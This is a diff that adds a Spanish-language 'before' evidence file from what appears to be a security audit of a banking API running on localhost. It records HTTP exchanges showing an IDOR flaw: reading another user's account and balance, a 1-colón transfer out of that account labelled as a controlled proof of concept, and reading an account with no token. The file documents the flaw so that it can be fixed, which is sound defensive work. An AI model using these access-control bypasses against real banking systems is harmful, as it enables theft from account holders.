@@ -1,0 +1,53 @@
+EVIDENCIA ORIGINAL - ANTES
+Fuente: docs/evidencias/antes-http.txt
+Fase: antes
+Fecha UTC: 2026-11-14T21:59:27.534697+00:00
+Base: http://localhost:8080
+
+CUENTA AJENA CON SALDO
+GET /api/cuentas/3
+HTTP 200
+Content-Type: application/json
+{
+  "id": 3,
+  "usuarioId": 4,
+  "titular": "María Rojas Soto",
+  "numeroCuenta": "CR05015202001026458902",
+  "tipoCuenta": "CORRIENTE",
+  "saldo": 4850000.0,
+  "moneda": "CRC",
+  "activa": true
+}
+
+TRANSFERENCIA DESDE CUENTA AJENA
+POST /api/transacciones/transferir
+HTTP 201
+Content-Type: application/json
+{
+  "id": 5,
+  "cuentaOrigenId": 3,
+  "numeroCuentaOrigen": "CR05015202001026458902",
+  "titularOrigen": "María Rojas Soto",
+  "cuentaDestinoId": 2,
+  "numeroCuentaDestino": "CR05015202001026458901",
+  "titularDestino": "Carlos Mora Morales",
+  "monto": 1,
+  "conceptoHtml": "PoC IDOR controlada",
+  "fecha": "2026-11-14T15:59:39.1387199",
+  "estado": "COMPLETADA"
+}
+
+SIN TOKEN
+GET /api/cuentas/2
+HTTP 200
+Content-Type: application/json
+{
+  "id": 2,
+  "usuarioId": 3,
+  "titular": "Carlos Mora Morales",
+  "numeroCuenta": "CR05015202001026458901",
+  "tipoCuenta": "AHORROS",
+  "saldo": 250000.0,
+  "moneda": "CRC",
+  "activa": true
+}
